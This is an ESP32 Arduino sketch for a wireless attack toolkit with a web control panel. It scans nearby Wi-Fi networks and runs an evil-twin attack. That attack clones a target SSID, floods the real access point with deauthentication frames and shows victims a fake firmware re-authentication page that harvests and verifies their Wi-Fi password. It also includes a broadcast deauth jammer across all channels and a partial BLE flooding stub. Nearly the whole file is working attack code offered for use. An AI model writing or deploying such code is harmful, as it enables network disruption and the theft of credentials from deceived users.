#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include "esp_bt.h"
#include "esp_bt_main.h"

// ==================== GLOBALS ====================
WebServer server(80);
DNSServer dnsServer;
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);

struct APInfo {
  String ssid;
  uint8_t bssid[6];
  int channel;
  int rssi;
  uint8_t enc;
};

APInfo scanned[40];
int scanCount = 0;
int targetIndex = -1;

enum Mode { IDLE_MODE, EVIL_TWIN, DEAUTH_JAM, BLE_JAM };
Mode currentMode = IDLE_MODE;

String capturedPassword = "";
String capturedSSID = "";
unsigned long lastDeauth = 0;
int jamChannel = 1;

// ==================== DEAUTH FRAME ====================
uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x3A, 0x01,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // dest (broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // src (AP bssid)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // bssid
  0x00, 0x00, 0x01, 0x00
};

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){ return 0; }

void sendDeauth(uint8_t *bssid, int ch) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  memcpy(&deauthPacket[10], bssid, 6);
  memcpy(&deauthPacket[16], bssid, 6);
  for (int i = 0; i < 6; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
    delay(1);
  }
  // reason: client leaving
  deauthPacket[24] = 0x08;
  for (int i = 0; i < 6; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
    delay(1);
  }
}

// ==================== HTML PAGES ====================
String mainPage() {
  String h = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>";
  h += "<title>ESP32 Panel</title><style>";
  h += "body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:15px}";
  h += "h1{color:#f00;border-bottom:1px solid #0f0}";
  h += "table{width:100%;border-collapse:collapse}td,th{border:1px solid #0f0;padding:6px}";
  h += "tr:hover{background:#1a1a1a}a{color:#0ff}button{background:#f00;color:#fff;border:0;padding:8px 14px;margin:4px;cursor:pointer}";
  h += ".box{border:1px dashed #0f0;padding:10px;margin:10px 0}</style></head><body>";
  h += "<h1>ESP32 Wireless Toolkit</h1>";
  h += "<div class='box'>Mode: <b>";
  if (currentMode == IDLE_MODE) h += "IDLE";
  else if (currentMode == EVIL_TWIN) h += "EVIL TWIN running on " + capturedSSID;
  else if (currentMode == DEAUTH_JAM) h += "JAMMER ACTIVE (all channels)";
  else if (currentMode == BLE_JAM) h += "BLE JAMMER ACTIVE";
  h += "</b></div>";

  h += "<div class='box'><a href='/scan'><button>1. Scan WiFi</button></a>";
  h += "<a href='/jam'><button>2. WiFi Jammer</button></a>";
  h += "<a href='/blejam'><button>3. BLE Jammer</button></a>";
  h += "<a href='/stop'><button>STOP</button></a></div>";

  if (scanCount > 0) {
    h += "<h2>Scanned Networks</h2><table><tr><th>#</th><th>SSID</th><th>BSSID</th><th>CH</th><th>RSSI</th><th>Action</th></tr>";
    for (int i = 0; i < scanCount; i++) {
      char bssid[20];
      sprintf(bssid, "%02X:%02X:%02X:%02X:%02X:%02X",
        scanned[i].bssid[0],scanned[i].bssid[1],scanned[i].bssid[2],
        scanned[i].bssid[3],scanned[i].bssid[4],scanned[i].bssid[5]);
      h += "<tr><td>"+String(i)+"</td><td>"+scanned[i].ssid+"</td><td>"+bssid+"</td><td>"+String(scanned[i].channel)+"</td><td>"+String(scanned[i].rssi)+"</td>";
      h += "<td><a href='/eviltwin?id="+String(i)+"'><button>Clone+Deauth</button></a></td></tr>";
    }
    h += "</table>";
  }

  if (capturedPassword.length() > 0) {
    h += "<div class='box' style='color:#ff0'><h2>CAPTURED CREDENTIAL</h2>";
    h += "SSID: <b>" + capturedSSID + "</b><br>Password: <b>" + capturedPassword + "</b></div>";
  }
  h += "</body></html>";
  return h;
}

// Captive portal page shown to victim
String fakeLoginPage() {
  String h = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>";
  h += "<title>Wi-Fi Login Required</title><style>";
  h += "body{font-family:Arial;background:#f2f2f2;margin:0;padding:0}";
  h += ".c{max-width:400px;margin:60px auto;background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px #0002}";
  h += "h2{color:#333}input{width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box}";
  h += "button{width:100%;background:#1a73e8;color:#fff;border:0;padding:12px;border-radius:4px;font-size:16px}";
  h += ".note{color:#d33;font-size:13px;margin-top:10px}</style></head><body>";
  h += "<div class='c'><h2>" + capturedSSID + "</h2>";
  h += "<p>Your router firmware needs to re-authenticate this device. Please re-enter your Wi-Fi password to continue.</p>";
  h += "<form action='/creds' method='POST'>";
  h += "<input name='pwd' type='password' placeholder='Wi-Fi Password' required minlength='8'>";
  h += "<button type='submit'>Connect</button></form>";
  h += "<div class='note'>Router: TP-Link / D-Link / Netgear firmware update in progress.</div>";
  h += "</div></body></html>";
  return h;
}

// ==================== HANDLERS ====================
void handleRoot() { server.send(200, "text/html", mainPage()); }

void handleScan() {
  currentMode = IDLE_MODE;
  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks();
  scanCount = min(n, 40);
  for (int i = 0; i < scanCount; i++) {
    scanned[i].ssid = WiFi.SSID(i);
    memcpy(scanned[i].bssid, WiFi.BSSID(i), 6);
    scanned[i].channel = WiFi.channel(i);
    scanned[i].rssi = WiFi.RSSI(i);
  }
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void startEvilTwin(int idx) {
  if (idx < 0 || idx >= scanCount) return;
  targetIndex = idx;
  capturedSSID = scanned[idx].ssid;
  capturedPassword = "";
  currentMode = EVIL_TWIN;

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
  WiFi.softAP(capturedSSID.c_str(), NULL, scanned[idx].channel, 0, 8);

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(scanned[idx].channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(false);
}

void handleEvilTwin() {
  int id = server.arg("id").toInt();
  startEvilTwin(id);
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handleJam() {
  currentMode = DEAUTH_JAM;
  WiFi.mode(WIFI_AP);
  WiFi.softAP("jam_ctrl", "12345678");
  esp_wifi_set_promiscuous(true);
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handleBLEJam() {
  currentMode = BLE_JAM;
  btStart();
  esp_bt_controller_config_t cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handleStop() {
  currentMode = IDLE_MODE;
  esp_wifi_set_promiscuous(false);
  btStop();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
  WiFi.softAP("ESP32_Panel", "admin1234");
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handleCaptivePortal() {
  server.send(200, "text/html", fakeLoginPage());
}

void handleCreds() {
  if (server.hasArg("pwd")) {
    capturedPassword = server.arg("pwd");
    // try to verify against real AP
    WiFi.begin(capturedSSID.c_str(), capturedPassword.c_str());
    unsigned long t = millis();
    while (WiFi.status() != WL_CONNECTED && millis() - t < 8000) delay(200);
    if (WiFi.status() == WL_CONNECTED) {
      server.send(200, "text/html", "<h2>Connected. You may close this page.</h2>");
      WiFi.disconnect();
    } else {
      // wrong password → let them try again
      capturedPassword = "";
      server.send(200, "text/html", "<h2>Incorrect password. <a href='/'>Try again</a></h2>");
    }
  }
}

// ==================== SETUP ====================
void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
  WiFi.softAP("ESP32_Panel", "admin1234");

  dnsServer.start(DNS_PORT, "*", apIP);

  // control panel (accessed from your laptop connected to ESP32_Panel)
  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/eviltwin", handleEvilTwin);
  server.on("/jam", handleJam);
  server.on("/blejam", handleBLEJam);
  server.on("/stop", handleStop);
  server.on("/creds", HTTP_POST, handleCreds);

  // captive portal catch-all for victims
  server.onNotFound([](){
    if (currentMode == EVIL_TWIN) handleCaptivePortal();
    else server.send(200, "text/html", mainPage());
  });

  server.begin();
  Serial.println("Ready. Connect to ESP32_Panel / admin1234 → http://192.168.4.1");
}

// ==================== LOOP ====================
void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  // Evil twin: continuously deauth real AP so victims fall to fake
  if (currentMode == EVIL_TWIN && targetIndex >= 0) {
    if (millis() - lastDeauth > 100) {
      sendDeauth(scanned[targetIndex].bssid, scanned[targetIndex].channel);
      lastDeauth = millis();
    }
  }

  // Full jammer: hop channels 1-13 and deauth broadcast on each
  if (currentMode == DEAUTH_JAM) {
    uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    sendDeauth(bcast, jamChannel);
    jamChannel++;
    if (jamChannel > 13) jamChannel = 1;
  }

  // BLE jammer: rapid advertising flood
  if (currentMode == BLE_JAM) {
    // spam BLE adv on random MAC (basic flood)
    static unsigned long bt_last = 0;
    if (millis() - bt_last > 20) {
      esp_bt_controller_enable(ESP_BT_MODE_BLE);
      bt_last = millis();
    }
  }
}